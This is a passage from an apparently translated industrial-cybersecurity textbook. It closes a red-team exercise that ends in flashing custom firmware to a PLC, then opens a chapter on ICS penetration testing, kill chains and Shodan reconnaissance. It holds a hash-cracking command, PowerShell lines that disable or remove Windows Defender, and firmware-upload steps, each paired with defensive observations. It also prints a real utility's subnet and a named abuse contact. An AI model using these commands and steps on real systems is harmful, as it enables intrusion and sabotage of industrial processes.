  \ Domain : LAB-DOMAIN.LOCAL\n* Password : (null)\nssp :\ncredman :\n...\n```\n\n\
  不幸的是，Mimikatz 没有找到明文密码，这种情况自 Windows 10 成为主流以来很少见。但我们确实有一个 NTLM 哈希可以尝试破解。用 John\
  \ the Ripper 运行它，得到以下结果：\n\n```\n└─(pacKVM0101011)-[~]\n└$ john /home/pac/workdir/hashes\
  \ --format=nt --wordlist=/usr/share/wordlists/rockyou.txt\n1 x\nUsing default input\
  \ encoding: UTF-8\nLoaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])\nWarning:\
  \ no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to\
  \ abort, almost any other key for status\nPassword123 (?) \n1g 0:00:00:00 DONE (2021-02-27\
  \ 18:12) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s coco21..redlips\nUse the \"--show --format=NT\"\
  \ options to display all of the cracked passwords reliably\nSession completed\n\
  ```\n\n好吧，Mark 显然不会选择聪明的密码！如果这看起来过于简单，我要指出，密码仍然是大多数公司安全态势中最薄弱的环节。此外，如果我们没有通过破解找到密码，我们可以获取哈希并尝试进行哈希传递攻击，即在工具中直接使用哈希凭据，而不必先找到密码。另外，借助对\
  \ Mark 计算机的域管理员访问权限，我们可以直接更改或删除他的密码、安装键盘记录器，或使用任何其他迂回的方法来访问他的账户。这里要明白的一点是，我们需要访问\
  \ Mark 的账户，才能使用该账户连接到工业资产（*WORKSTATION10*）。正如我们稍早抓取的缓存凭据所示，工业域和企业域之间存在某种信任关系，因为缓存用户名是\
  \ `lab-domain.local\\mgibson`，而目标计算机显示为 `workstation10.ot-domain.local`。\n\n至此，我们确实已经拥有进入工业工作站所需的全部拼图。让我们稍作回顾，看看当前所处的位置。下面的截图展示了基于我们目前收集到的信息，*Z公司*\
  \ 的网络拓扑情况：\n\n![](img/c8ffa9959721097701584fcc95101362_644_0.png)\n\n图 16.26 – 观察到的\
  \ Z 公司架构\n\n## 蓝队观察\n\n红队演习的这一阶段中，唯一可能且本应被发现的部分是 Mimikatz 的运行。如果防病毒解决方案保持最新，通常应该能识别出\
  \ Mimikatz，因为它太出名了——即使不是可执行文件，至少也是它的行为。完全坦白：Windows Defender 确实捕获了我在 WIN10-1 上运行\
  \ Mimikatz 的尝试，因此我使用以下 PowerShell 命令禁用了它以进行演习：\n\n```\nSet-MpPreference -DisableRealtimeMonitoring\
  \ $true\n```\n\n这会导致 Windows Defender 不再提供实时保护，如下所示：\n\n# 实时保护\n\n查找并阻止恶意软件在设备上安装或运行。您可以短暂关闭此设置，之后它会自动重新开启。\n\
  \n实时保护已关闭，您的设备容易受到攻击。\n\n关闭\n\n图 16.28 – Windows Defender 已关闭\n\n在 Windows Server\
  \ 系统上，我们可以使用以下命令彻底删除 Windows Defender：\n\n```\nUninstall-WindowsFeature -Name Windows-Defender\n\
  ```\n\n不过，蓝队应该能够捕捉到这两条命令。将这些观察添加到列表中：\n\n- 安装、更新并监控防病毒或端点保护解决方案。\n- 监控防病毒服务事件（防篡改保护）。\n\
  \n> **注意**\n> \n> 事先提醒一句。此时，应停止目标的生产活动。在生产期间进行任何红队活动都是不可取的！\n\n## 工业环境侦察\n\n在 *Z公司*\
  \ 的工业网络中站稳脚跟后，是时候朝着我们的目标前进了：向红队演习范围内定义的 PLC 上传新固件。我们可以通过代理将扫描工具从互联网转向工业网络，也可以将工具下载/复制到\
  \ `Workstation10` 上，但在投入这么多精力之前，让我们先想一想。一定有人在某个时候设置了测试 PLC，所以让我们在当前的机器上寻找线索。在 Windows\
  \ 文件资源管理器中搜索 `C:` 驱动器上的 `Left` 一词，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_647_0.png)\n\
  \n哈！Engineer-3 的 Documents 文件夹中似乎有一个名为 Test_Left.ACD 的 ACD 文件（一个 Allen-Bradly ControlLogix\
  \ 程序文件）。ACD 文件是 RsLogix 5000（罗克韦尔自动化 PLC 的编程软件）的项目文件。让我们打开这个项目，看看能从中发现什么，如下所示：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_648_0.png)\n\n图 16.30 – Test_Left.ACD\
  \ 项目\n\n从这个项目中，我们可以发现 Test_Left PLC 的 IP 地址和机架位置（插槽），显示在屏幕顶部的路径中 - 172.25.200.11\\\
  Backplane\\0（表示机架中的 0 号插槽）。我们可以验证这是交战规则中定义的 IP 地址。\n\n我们现在拥有使用自定义固件攻击 Test_Left\
  \ PLC 所需的全部信息。\n\n## 蓝队观察\n\n蓝队几乎不可能检测到使用标准工具（LoTL）进行的侦察活动。此时，行为分析是检测 mgibson 用户在其正常非工作时间登录的唯一选择，这显示在我们于第\
  \ 9 章“可视化、关联和告警”中创建的威胁检测仪表板上，如下面的截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_649_0.png)\n\
  \n图 16.31 – 显示 RDP 连接的入侵检测仪表板\n\n那就是我们（10.0.0.200），在 18:40 使用 RDP 连接到 Workstation10（172.25.100.210），大约在合法用户\
  \ mgibson 于 17:07 下线后的 90 分钟。\n\n将此观察添加到列表中：\n\n- 使用轮班表来验证进入工业环境的入口（远程连接）是否合法。\n\
  \n## 最终目标——攻击 Test_Left PLC\n\n现在，我们如何让 Test_Left PLC 更新新的固件镜像？问题是，固件更新软件通常与其他 PLC\
  \ 编程软件工具一起安装。因此，如果我们可以将自定义固件传输到 Workstation10 机器上，就可以使用现有工具上传固件。我们将把自定义固件存储在 Kali\
  \ Linux Apache Web 服务器的 files 文件夹中，如下面的截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_649_1.png)\n\
  \n图 16.32 – 将固件复制到 Web 服务器的 files 文件夹\n\n现在，我们可以通过 Web 浏览器从 TEST_REPORTSSER 访问它，如下所示：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_650_0.png)\n\n图 16.33 – 将固件下载到 Test_ReportsServer\n\
  \n下载完成后，我们可以使用 RDP 协议的文件共享功能，将文件复制到与 WIN10-1 的 RDP 会话中，如下面的截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_650_1.png)\n\
  \n图 16.34 – 通过 RDP 客户端文件传输功能将固件文件复制到 WIN10-1\n\n我们可以再次使用 RDP 客户端的功能，将其从 WIN10-1\
  \ 复制到 Workstation10，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_650_2.png)\n\
  \n图 16.35 – 通过 RDP 客户端文件传输功能将固件文件复制到 Workstation10\n\n现在，我们可以部署固件了。为此，我们将使用 Rockwell\
  \ 的 ControlFlash 实用程序，步骤如下：\n\n- 1. 在“开始”菜单 |“Flash Programming Tools”|“ControlFlash”下打开该实用程序。\n\
  - 2. 在欢迎屏幕上单击“下一步”。\n- 3. 在“Catalog Number”屏幕上单击“浏览”，接着在“Firmware Kit Locations”屏幕上单击“添加”，然后浏览到存放\
  \ custom-firmware.bin 文件的文件夹，如下面的截图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_651_0.png)\n\
  \n图 16.36 – ControlFlash 实用程序：自定义固件位置\n\n4. 单击“确定”，再次单击“确定”，然后“下一步”进入“Device Selection”屏幕。\n\
  \n\n\n\n+   5. 在 `Rslinx` 树中找到 `Test_Left` PLC 并点击 `OK`，如下图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_652_0.png)\n\
  \n+   6. 在 **Firmware Revision** 屏幕中选择控制器的自定义固件并点击 **Next**，如下图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_652_1.png)\n\
  \n+   7. 固件现在将由 ControlFlash 实用程序上传到控制器并安装，如下所示：\n\n![](img/c8ffa9959721097701584fcc95101362_653_0.png)\n\
  \n图 16.39 – ControlFlash 实用程序：应用固件\n\n好了——我们完成了。是时候写报告并转到下一个工作了。\n\n## Blue Team\
  \ 观察\n\n更新自动化设备的固件，就像我们对 Test_Left PLC 所做的那样，由于部署了以 OT 为中心的入侵检测系统（IDS），这是一个非常可观察的事件。SilentDefense\
  \ 在活动发生时向我们发出警报，如下图所示：\n\n![](img/c8ffa9959721097701584fcc95101362_653_1.png)\n\n\
  图 16.40 – 违规检测仪表板捕获固件下载\n\n另外一个建议是禁用从企业网络到工业网络的 RDP 会话中的文件传输（剪贴板共享）。这样就可以阻止我们（轻松地）将新固件传输到\
  \ Workstation10。禁用文件传输是我们在第 3 章《工业隔离区》中讨论过的远程桌面协议网关（RDP-GW）服务器的功能。\n\n### 总结\n\n\
  在本章中，我们讨论了红队演练的方方面面，它们与渗透测试有何不同，以及蓝队如何参与其中。然后我们为 *Company Z* 执行了一个红队参与示例，我们攻击了他们的\
  \ ICS，并成功替换了位于其工业网络上的 PLC 的运行固件，该 PLC “安全地”隐藏在防火墙后面，与企业网络隔离。在此过程中，我们讨论了蓝队可能捕获我们活动的机会，并讨论了更好地保护该设置的建议。\n\
  \n我们在示例红队演练中涵盖的内容仅展示了一种实现目标的方法。绝不应该将其用作执行此类评估的剧本，但应将其用作指导您完成攻击各个阶段的指南。\n\n在下一章中，我们将讨论渗透测试的方方面面，并获得为\
  \ *Company Y* 执行渗透测试的实践经验。\n"
- "# 17\n\n# 渗透测试 ICS 环境\n\n在本章中，我们将详细讨论在工业控制系统（ICS）环境中执行渗透测试时使用的工具、技术、方法论和活动。我们将学习渗透测试为何基于现实世界的攻击\
  \ **工具、技术和流程（TTPs）** 时最有效，并参考网络杀伤链。我们还将讨论如何通过构建测试床并近似受审查的工业环境，以零生产过程风险的方式执行渗透测试参与。到本章结束时，您将获得所需的知识和实践经验来自行执行此类评估。\n\
  \n本章将涵盖以下主题：\n\n- 渗透测试的实践视角\n- 为什么 ICS 环境对攻击者来说是容易的目标\n- ICS 环境的典型风险\n- 围绕 ICS Kill\
  \ Chain 建模渗透测试\n- 渗透测试结果使我们能够优先考虑网络安全工作\n- 渗透测试工业环境需要谨慎\n- 练习 – 执行以 ICS 为中心的渗透测试\n\
  \n## 渗透测试的实践视角\n\n我们在之前的章节中简要讨论了渗透测试，但在整个本章中，我们将从实践角度审视这一概念，详细说明如果正确执行渗透测试，可以显著提高您的安全计划的有效性并带来更好的投资回报。这是通过让您规划和优先考虑网络安全预算和工作来实现的。\n\
  \n我们将从讨论为什么 ICS 环境成为如此诱人的目标开始我们的讨论。\n\n## 为什么 ICS 环境对攻击者来说是容易的目标\n\n让我们快速讨论为什么 ICS\
  \ 成为如此容易的目标。这很重要，因为它描绘了在渗透测试这些环境时使用的一些方法和角度。总结来说，ICS 被认为容易受到攻击的原因如下：\n\n- 从设计上讲，ICS\
  \ 本质上是开放的，易于与其工作的人员访问，并且在系统互连方面几乎没有障碍。这种开放的特性通常会在系统中引入常见的弱点，例如以下情况：\n  - 默认或容易猜测的密码（如果定义了密码的话）\n\
  \  - 允许我们轻松连接/共享/访问资源的默认系统配置\n  - 允许过多系统访问的用户和进程权限\n  - 缺乏或缺失的安全控制\n\n此外，由于安全从未被视为\
  \ ICS 及其组件的设计考虑因素，因此诸如加密、**身份验证、授权和审计（AAA）** 以及日志记录等安全控制通常开箱即用时不存在，且事后难以或不可能添加。\n\
  \n- ICS 通常是由供应商以非常特定的方式组装而成的专有系统集合，以使 ICS 以特定方式运行。更改 ICS 的单个组件，例如通过安装应用程序或操作系统补丁，可能会破坏这种微妙的平衡。因此，构成\
  \ ICS 的系统通常运行未修补、过时甚至过时的软件、操作系统和固件。\n- ICS 操作人员通常并不从事网络安全工作，至少不像运营在线商店的组织那样。因此，网络安全意识培训通常缺乏或不存在，使这些\
  \ ICS 操作人员容易受到社会工程攻击。\n- 生产过程利润率低。\n\n围绕我们刚刚讨论的内容，让我们谈谈 ICS 环境的典型风险。\n\n## ICS 环境的典型风险\n\
  \n由于典型 ICS 的特性，以下风险类别可以在大多数 ICS 环境中找到：\n\n- **拒绝服务攻击：** 对 ICS 来说最大的风险无疑是 **拒绝服务（DOS）**\
  \ 攻击（请记住，正常运行时间和可用性是 ICS 的主要关注点）。DOS 攻击基于使目标资源过载，以至于合法用户无法再与目标系统交互。DOS 攻击的经典示例是\
  \ SYN flood，其中攻击者向目标系统轰炸所谓的 SYN 数据包——TCP SYN 标志被设置的数据包。SYN 数据包是三次握手中的第一个数据包，并在两个系统之间建立连接。收到攻击者的\
  \ SYN 数据包后，目标将分配一些资源（套接字）以使用 SYN/ACK 数据包响应 SYN 数据包（TCP 标志 SYN 和 ACK 被设置的数据包）来告诉攻击者，“我准备好建立连接了。”\
  \ 在正常握手中，原发者（攻击者）本应在此阶段响应 SYN/ACK。通过省略最后一步，攻击者有效地使连接半开，浪费了受害者所在的位置资源。现在，想象一下创建数千个这些半开连接；受害系统很快就会耗尽资源并开始过载。使这些类型的攻击在\
  \ ICS 环境中尤其危险的是，这些环境中的大多数设备本身就性能不足，并且经常过载以执行其常规任务。如果您开始给它们施加额外压力，它们很快就会在额外负载下崩溃。\n\
  \n\n\n\n## 物理安全\n- **物理安全**：物理安全仍然是工业控制系统（ICS）（网络）安全中常被忽视的一部分。然而，事实是，如果攻击者成功进入 ICS\
  \ 环境，他们所能造成的危害是无底线的。\n\n## 过时操作系统、软件、PLC/IO/控制器固件以及运行 ICS 流程的应用程序（例如 HMI/PLC 程序）中的漏洞\n\
  - **过时操作系统、软件、PLC/IO/控制器固件以及运行 ICS 流程的应用程序（例如 HMI/PLC 程序）中的漏洞**：由于我们在前一节中讨论的几个原因，ICS\
  \ 固件、软件、操作系统和应用程序通常不会定期更新。这使得攻击者能够利用在常规 IT 网络中通常已完全过时的漏洞利用工具。例如，Conficker 蠕虫在 2008\
  \ 年晚些时候成为头条新闻（[https://antivirus.comodo.com/blog/comodo-news/conficker-worm/](https://antivirus.comodo.com/blog/comodo-news/conficker-worm/)），至今仍可在某些\
  \ ICS 环境中发现，主要原因是允许该蠕虫传播的底层漏洞（MS08-076）从未得到修复。至于 WannaCry（MS17-010），那就更不必多说了。\n\n\
  ## 恶意软件\n- **恶意软件**：沿着上一个风险类别的思路，恶意软件对 ICS 环境具有毁灭性影响。恶意软件不仅能在 ICS 未打补丁的网络基础设施中蓬勃发展，而且在其肆意运行时还会造成重大损害。勒索软件在这个类别中名列前茅，损失超过数千万美元的情况正逐渐成为一种常态。\n\
  \n## 密码的嗅探、猜测和破解\n- **密码的嗅探、猜测和破解**：由于实施宽松的安全策略、过时的软件以及 ICS 网络缺乏加密，嗅探、猜测和破解密码哈希转储对攻击者来说是一项利润丰厚的业务。\n\
  \n## 社会工程学\n- **社会工程学**：正如我们在前一节中讨论的那样，由于 ICS 操作员的主要重点不是网络安全，而是尽可能高效且低成本地让产品出厂，因此他们更容易遭受社会工程学攻击。\n\
  \n一次经过周密计划的渗透测试演练将涵盖所有这些风险类别，并遵循一种基于真实世界攻击场景的系统化方法。在下一节中，我们将讨论如何通过将其建模为 ICS 杀伤链方法，将真实世界攻击场景纳入我们的渗透测试工作中。\n\
  \n## 围绕 ICS 杀伤链建模渗透测试\n\n正如我们在前一节中讨论的，ICS 环境是攻击者的理想目标，具有与 ICS 环境独特性相关的固有风险。由于这些独特特征以及\
  \ ICS 环境的架构，严重攻击者将遵循一种独特的方法来攻击工业网络（杀伤链）。围绕这种独特的攻击方法建模渗透测试是有意义的。详细介绍这种攻击方法的最佳撰写形式之一是\
  \ SANS 研究所提出的工业控制系统网络杀伤链，可在以下地址找到：[https://www.sans.org/reading-room/whitepapers/ICS/industrial-control-system-cyber-kill-chain-36297](https://www.sans.org/reading-room/whitepapers/ICS/industrial-control-system-cyber-kill-chain-36297)。\n\
  \n让我们通过解释网络杀伤链来开始我们的讨论。\n\n### 网络杀伤链详解\n\n网络杀伤链的概念最初由军用防御公司洛克希德·马丁公司的分析师创建。他们于 2011\
  \ 年发表了一篇描述该概念的论文，最初称之为**入侵杀伤链**。入侵杀伤链概念的目的是帮助在潜在的（物理）攻击或入侵过程中进行决策。\n\n在网络安全的领域中，入侵杀伤链被称为**网络杀伤链**。\n\
  \n### 入侵杀伤链\n\n入侵杀伤链描述了一个针对目标执行的过程，旨在产生预期的效果（目标）。它被描绘为一系列事件，因为它由一系列执行阶段组成，中断或减轻任何一个执行阶段都会导致链条断裂，从而阻止攻击者达成其目标。\n\
  \n入侵杀伤链通过七个步骤的程序序列来描述高级攻击中的每个步骤或阶段。链条方法使得识别和理解攻击的每个阶段变得更加容易。下图显示了七个入侵杀伤链阶段：\n\n\
  ![](img/c8ffa9959721097701584fcc95101362_660_0.png)\n\n图 17.1 – 入侵杀伤链阶段\n\n该模型是为企业环境设计的，因此并不完全适合应用于\
  \ ICS 环境，这主要归因于这些环境的性质以及针对它们的攻击。以下部分将描述一个针对 ICS 环境的具体改编模型。\n\n# ICS 网络杀伤链\n\n由于其独特的特性和部署方式，ICS\
  \ 需要对目标行业——即 ICS 环境——拥有相当的知识才能实施成功的攻击。工业控制系统的这些独特挑战要求攻击者在执行攻击时避免干扰大量的传感器、控制装置和自动化设备，同时也能够穿透此类环境中通常存在的多层网络（从互联网到企业网络，再到工业网络，进而到飞地，等等）。\n\
  \n为了从直观上了解这些独特挑战，SANS 研究所（[https://www.sans.org/about/](https://www.sans.org/about/)）于\
  \ 2015 年发布了一份报告，将网络杀伤链改编为适用于工业控制系统环境。该报告通过其他方法扩展了原始的入侵杀伤链阶段，其中一项方法是将其阶段划分为两个不同的阶段，目的是阐述\
  \ ICS 的特征。下图显示了 ICS 杀伤链的第一阶段：\n\n![](img/c8ffa9959721097701584fcc95101362_661_0.png)\n\
  \n图 17.2 – ICS 网络杀伤链的第一阶段\n\n当攻击者成功攻陷目标时，ICS 网络攻击的第一阶段即视为完成。攻击将继续进入第二阶段。请注意，在某些情况下，攻击的第一阶段并未实施。这可能是通过其他方式获得对工业网络的访问权限，例如通过暴露在互联网上的\
  \ ICS 系统或设备，或者如果攻击者通过供应链漏洞进入，例如被攻破的供应商或工程/支持公司。\n\n下图显示了典型 ICS 网络攻击的第二阶段：\n\n![](img/c8ffa9959721097701584fcc95101362_663_0.png)\n\
  \n图 17.3 – ICS 网络杀伤链的第二阶段\n\n在第二阶段，攻击第一阶段期间收集的知识被用于准备对 ICS 环境的攻击。这个阶段可以直接在成功完成第一阶段之后开始，但阶段之间可能存在延迟。\n\
  \n通常，以下阶段是网络杀伤链第二阶段的组成部分：\n\n- **规划**：在第二阶段的规划阶段，攻击者将规划攻击路径，选择和定义将使用的工具和漏洞利用，并通常确保他们发展其能力，以成功完成目标\
  \ ICS 环境的独特挑战。\n- **验证**：在验证阶段，攻击者将在与受害者 ICS 设置相同或相似的环境中，验证 ICS 攻击者所需的（新）能力。其想法是通过在受害者环境的模拟上练习攻击，攻击者有机会测试、规划、准备和演练攻击，希望避免可能导致其无法达成目标的错误。这对攻击者来说是一个巨大的挑战，因为模拟\
  \ ICS 环境中使用的整个系统是一项高度复杂且耗时的工作。\n- **ICS 攻击**：这是 ICS 网络杀伤链的最后阶段。在此阶段，攻击者将执行整个网络攻击的最终目标。这是攻击的核心所在。目标可以是窃取机密信息、扰乱生产过程、工业间谍活动、黑客行动主义目标，甚至是更阴险的目标，如对环境或员工造成损害或伤害。\n\
  \n至此，我们已解释了 ICS 网络杀伤链，详细说明了攻击者如何通过不同的攻击阶段和步骤达到特定目标。接下来，我们将学习如何在执行渗透测试业务时使用该模型。\n\
  \n\n\n\n# 基于 ICS Kill Chain 的渗透测试方法论\n\n那么，这如何适用于手头的任务；即执行 ICS 渗透测试任务？让我们来看一下 ICS\
  \ 网络 Kill Chain 的高层次概述：\n\n![](img/c8ffa9959721097701584fcc95101362_665_0.png)\n\
  \n图 17.4 – 高层次 ICS 网络 Kill Chain 概述\n\n在这里，我们可以看到有四个主要步骤：\n\n+   1. 进入企业网络（除非我们足够幸运能找到互联网暴露的工业设备）。\n\
  +   2. 找到一种方式进入工业环境。\n+   3. 通过攻击和利用工业环境找到通往目标的路径。\n+   4. 一旦路径已确定，就实现攻击的最终目标。\n\
  \n为了使我们的渗透测试任务尽可能准确地反映现实世界的攻击方法，我们将围绕这四个主要步骤来定制任务。任务的具体实施（使用的工具、技术和流程）应根据目标组织和环境进行定制，并考虑诸如攻击规则（什么、什么时间、什么、如何等是禁止的）、目标的\
  \ ICS 环境以及其他独特特征等因素。\n\n我们将在本章的即将进行的练习中学习如何在攻击计划中实现 ICS 网络 Kill Chain 模型形状。\n\n\
  ## 渗透测试结果使我们能够优先考虑网络安全工作\n\n当你将渗透测试与风险评估的漏洞映射工作相结合时，你可以从风险方程中 **可能性** 指标的额外准确性中受益。通过执行渗透测试来验证\
  \ ICS 环境中漏洞的可利用性，并考虑该环境的所有方面和因素/情况，你可以为风险评估流程得出的风险评分附加信心。有了这种额外的信心，我们可以优先考虑缓解措施，这使我们能够首先解决真正最大的风险因素，从而提高风险评估流程和整个安全计划的整体投资回报率。\n\
  \n## 渗透测试工业环境需要谨慎\n\n到目前为止，在本书中，我们讨论了通过执行许多主动安全监控活动对 ICS 环境造成的潜在风险。渗透测试是你可以在 ICS\
  \ 环境上执行的终极主动扫描和质询活动。评估要求我们扫描、探测、戳探、模糊测试、攻击、利用并给我们事先同意且对这种虐待敏感的系统和设备施加压力。\n\n因此，在\
  \ ICS 环境上执行渗透测试活动时，我们应格外小心。至少，生产过程应完全停止，并且能够在出现问题时帮助恢复系统和设备的人员应参与其中。但更理想的是，我们应该创建一个\
  \ ICS 环境的近似值来执行渗透测试活动，或利用组织已有的测试环境，如果你足够幸运能与拥有运行测试环境资源的客户合作。\n\n在下面的部分中，我们将讨论创建工业环境的近似值。\n\
  \n## 创建工业环境的近似值\n\n我们之前在 *第 15 章，工业控制系统风险评估* 中讨论过为测试和扫描目的创建目标 ICS 环境的近似值。重申一下，我们希望避免直接在\
  \ ICS 设备上执行扫描、探测、黑客攻击、利用和其他高强度活动，以避免冒破坏生产过程或我们正在测试的设备风险。为了在安全环境中进行这些渗透测试活动，应创建 ICS\
  \ 环境的副本。而且由于通常不可能对这种环境进行一对一克隆，我们应该对环境进行近似，其中我们对每个独特设备或系统进行采样并在测试平台中复制它。\n\n现在，让我们动手完成一些渗透测试活动。\n\
  \n## 练习 – 执行以 ICS 为中心的渗透测试\n\n在本章的练习中，我们将在 *第 16 章，红队/蓝队演练* 中用作目标的同一家公司 Z 上执行渗透测试任务。该练习主要集中于工业环境的渗透测试活动，因为\
  \ *第 16 章，红队/蓝队演练* 已经详细展示了企业方面的内容。我们将在本章中包含渗透测试任务企业方面的高层次规划。\n\n### 准备工作\n\n就像红队评估一样，我们需要准备任务。范围、时间线、允许的攻击方法以及目标资产信息、任务交付成果以及渗透测试活动可以执行的时间限制等后勤细节应进行讨论、详细说明并写入合同中，以避免任何误解。\n\
  \n## 设置测试环境\n\n对于本次练习，我们将设置一个测试环境，涵盖公司 Z 整个 ICS 环境的所有系统和设备。我们唯一不会使用此测试环境的时间是在执行第一步\
  \ – 攻击任务的企业环境时。除非明确禁止，全面（ICS）渗透测试应揭示可在目标公共 IP 子网上发现的任何漏洞（及其可利用性）。大多数组织会要求你将企业网络作为触及实时/生产系统的\
  \ ICS 渗透测试的一部分，而将工业网络构建在测试环境中。有了公司 Z，我们很幸运可以为整个 ICS 环境构建一个测试环境，该环境跨越企业和工业网络。\n\n\
  请注意，如果可以，为目标环境构建测试设置始终是执行渗透测试任务的首选方法。\n\n## 克隆环境\n\n作为任务范围界定工作的一部分，我们收到了来自公司 Z 的以下\
  \ ICS 架构图：\n\n![](img/c8ffa9959721097701584fcc95101362_669_0.png)\n\n正如我们所见，多个系统和设备是相同的（或足够接近，我们可以用测试平台中的单个系统来近似其存在）。现在，如果我们合并任何重复/相似的系统，我们可以将测试平台架构缩小到以下内容：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_670_0.png)\n\n# 图 17.6 – 公司 Z – 渗透测试测试平台架构\n\
  \n此时，我们可以使用物理硬件、虚拟化技术以及在公司 Z 备件部门找到的设备和系统来创建测试平台。我们将为物理设备安装所有正确的固件，在可能的情况下对工作站和服务器执行\
  \ **物理到虚拟（p2v）** 转换，并简单地克隆（复制）操作系统中的虚拟机。p2v 或克隆的优势在于，我们将工作站或服务器的所有设置、用户、应用程序和补丁级别复制到我们的测试平台。对于交换机、路由器和防火墙，我们希望安装确切的固件版本并导出生产系统的运行配置，然后将其应用到我们的测试平台。一旦我们完成此过程，我们将拥有生产环境的接近近似值，我们可以在其上执行渗透测试活动，而不会冒破坏生产或损坏关键资产的风险。\n\
  \n让我们通过讨论攻击企业环境来开始渗透测试任务活动。\n\n## 渗透测试任务步骤 1 – 攻击企业环境\n\nICS 渗透测试练习的前两个步骤与 ICS 网络\
  \ Kill Chain 的第一阶段同义：我们希望进入目标的工业网络。如果我们幸运的话，这可以通过互联网暴露的工业控制系统或设备的捷径来实现。我们将在下一节 *Shodan\
  \ 公共子网评估* 中探索该途径。通常，捷径不可用，或者任务特别希望我们在任何其他攻击向量之外找到穿过企业网络的路径。公司 Z 也是如此。他们希望我们找到任何攻击途径，任何我们可以利用的威胁向量和漏洞，以进入他们的工业网络，并中断生产或窃取敏感数据。\n\
  \n让我们从对任何面向互联网的控制系统进行 Shodan 搜索开始渗透测试任务。\n\n\n\n\n## Shodan 公共子网评估\n\n虽然我们不会在本章中花太多时间对企业环境进行渗透测试，但我希望向您介绍如何对您的（目标）公共\
  \ IP 地址范围执行 Shodan 评估。事实上，定期执行 Shodan 评估以揭示您公开暴露系统的详细信息，是很有必要的，这样可以确认您没有意外地将某些内部系统暴露给外部世界，并承担由此带来的所有后果。请按照以下步骤对您的（公司）公共\
  \ IP 地址范围执行 Shodan 评估：\n\n- 1. 首先，我们必须找到我们的公共 IP 地址范围。为此，只需从公司网络中的客户端访问 https://ipinfo.io：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_672_0.png)\n\n2. 该网站将自动显示您用于访问该网站的（公共）IP\
  \ 的详细信息，其中最重要的部分是 **自治系统编号（ASN）** 路由详细信息：\n\n```\nas n: Object\n  as n: \"AS19752\"\
  \n  name: \"Hydro One Telecom Inc.\"\n  domain: \"hydroonetelcom.com\"\n  route:\
  \ \"142.46.240.0/21\"\n  type: \"isp\"\ncompany: Object\n  name: \"Brantford Hydro\"\
  \n  domain: \"brantford.ca\"\n  type: \"business\"\nabuse: Object\n  address: \"\
  CA, ON, Brantford, 44 King Street Suite 206, N3T 3C7\"\n  country: \"CA\"\n  email:\
  \ \"jnagle@brantford.ca\"\n  name: \"James Nagle\"\n```\n\n图 17.8 – 公共 IP 子网范围\n\
  \n3. ASN 路由是分配给您组织的子网——即您组织拥有的公共 IP 地址范围。前面示例中的 IP 地址范围是 `142.46.240.0/21`（请注意，我为这个练习随机选择了一个\
  \ IP 地址，得到的信息正好满足本次练习的需求）。\n\n4. 有了公共 IP 地址范围后，我们访问 https://www.shodan.io 并搜索 net:142.46.240.0/21（请注意，您需要标准许可证才能执行网络查找）。将显示\
  \ 262 条结果：\n\n![](img/c8ffa9959721097701584fcc95101362_674_0.png)\n\n图 17.9 – 在\
  \ Shodan 上查找 IP 范围\n\n5. 这些结果中的大多数是您公司向互联网公开的合法服务。我们需要开始缩小结果范围，以查找任何已暴露的 ICS 系统。例如，如果我们知道生产设施中有西门子设备，可以搜索\
  \ net:142.46.240.0/21 siemens。在本例中，搜索结果没有任何发现：\n\n![](img/c8ffa9959721097701584fcc95101362_674_1.png)\n\
  \n图 17.10 – 搜索西门子暴露的系统\n\n请注意，此时我们只需让 RSLogix 500/5000 连接到公共 IP 地址即可开始与暴露的设备交互，或者使用\
  \ Python 模块（例如 `pylogix`（https://github.com/dmroeder/pylogix））开始攻击系统。像这样发现暴露在互联网上的系统，对攻击者来说纯粹是运气——无需穿过企业网络并横向进入工业网络；我们找到了一条捷径，可以直接访问\
  \ ICS 中最脆弱的部分。\n\n不用说，这样的发现值得高度关注，因此应尽快处理。接下来，我们将讨论如何使用**开源情报（OSINT）**信息对目标进行侦察。\n\
  \n## OSINT 收集\n\n在攻击企业环境之前，我们需要确定应该从哪里入手。利用 OSINT 资源和工具，我们希望识别目标的以下详细信息：\n\n- 公共\
  \ IP 地址范围（https://ipinfo.io、WHOIS 记录等）\n- 潜在的用户名、电子邮件地址、员工详细信息等（WHOIS 和 DNS 记录、Facebook、Twitter、Stack\
  \ Overflow、LinkedIn 等）\n- 正在使用的技术，例如操作系统、应用程序、服务等（https://www.shodan.io、https://censys.io/、https://builtwith.com/、招聘信息、LinkedIn\
  \ 帖子、支持站点帖子等）\n- 任何其他可能有助于后续活动的数据\n\n在 OSINT 收集结束时，我们应该获得一个可以开始扫描和探测的 IP 地址列表。\n\
  \n## 扫描公共 IP 地址\n\n有了目标公共 IP 地址范围（请与客户核实列表或对照交战规则进行验证！），我们就可以开始探测该范围内正在运行（存活）的系统以及这些系统上的开放端口（服务）。与红队演练不同，我们在这里不必温和。渗透测试的目标是在约定的时间内尽可能多地发现弱点。我们可以以目标系统能够承受的速度快速执行端口扫描和探测活动。\n\
  \n在此活动结束时，我们应该获得存活系统和开放端口的列表；也就是可以开始探索漏洞的暴露服务。\n\n## 发现漏洞\n\n现在，我们已经知道目标公共 IP 地址中有哪些系统和服务正在响应，我们可以开始检测潜在漏洞。自动化漏洞扫描工具（例如\
  \ Nessus、Qualys 和 Rapid7）应成为我们检测漏洞的主要手段。我们无需担心隐蔽性，使用自动化解决方案通常可以更好地发现漏洞。根据具体情况，我们可以决定对目标拥有的（且在范围内的）任何\
  \ Web 应用程序执行一些手动漏洞评估。\n\n在漏洞发现步骤结束时，我们应该获得一个潜在系统/服务列表，我们可以尝试攻击这些系统/服务，以期利用它们并进入目标企业网络。\n\
  \n## 入侵企业网络 – 建立初始立足点\n\n由于渗透测试旨在为目标发现尽可能多的漏洞并验证这些漏洞是否可利用，因此我们应尝试利用上一步中发现的每个漏洞。必须详细记录我们利用漏洞的方式、日志和细节，这将帮助目标修复这些问题。\n\
